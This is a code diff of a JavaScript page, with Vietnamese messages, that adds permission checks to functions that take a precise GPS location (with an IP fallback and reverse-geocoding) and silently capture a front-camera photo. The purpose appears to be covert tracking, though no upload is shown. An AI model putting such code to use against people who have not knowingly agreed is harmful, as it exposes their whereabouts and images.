@@ -58,31 +58,37 @@ async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
-    navigator.geolocation.getCurrentPosition(
-      async pos => {
-        useGPS = true;
-        info.lat = pos.coords.latitude.toFixed(6);
-        info.lon = pos.coords.longitude.toFixed(6);
-        try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
-            headers: { 'User-Agent': 'Mozilla/5.0' }
-          });
-          const data = await res.json();
-          info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
-          info.country = data.address?.country || 'Không rõ';
-        } catch {
-          info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
-          info.country = 'Không rõ';
-        }
-        resolve();
-      },
-      async () => {
-        useGPS = false;
-        await fallbackIPLocation();
-        resolve();
-      },
-      { enableHighAccuracy: true, timeout: 8000 }
-    );
+    navigator.permissions.query({ name: 'geolocation' }).then(result => {
+      if (result.state === 'denied') {
+        return fallbackIPLocation().then(resolve);
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          useGPS = true;
+          info.lat = pos.coords.latitude.toFixed(6);
+          info.lon = pos.coords.longitude.toFixed(6);
+          try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
+              headers: { 'User-Agent': 'Mozilla/5.0' }
+            });
+            const data = await res.json();
+            info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
+            info.country = data.address?.country || 'Không rõ';
+          } catch {
+            info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
+            info.country = 'Không rõ';
+          }
+          resolve();
+        },
+        async () => {
+          useGPS = false;
+          await fallbackIPLocation();
+          resolve();
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    });
   });
 }
 
@@ -96,25 +102,29 @@ async function fallbackIPLocation() {
 
 function captureCamera(facingMode = 'user') {
   return new Promise((resolve, reject) => {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
-      .then(stream => {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        video.onloadedmetadata = () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
+    navigator.permissions.query({ name: 'camera' }).then(result => {
+      if (result.state === 'denied') return reject(new Error('Camera bị từ chối'));
 
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
-            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
-          }, 1000);
-        };
-      })
-      .catch(reject);
+      navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          video.onloadedmetadata = () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+
+            setTimeout(() => {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              stream.getTracks().forEach(track => track.stop());
+              canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
+            }, 1000);
+          };
+        })
+        .catch(reject);
+    });
   });
 }
 
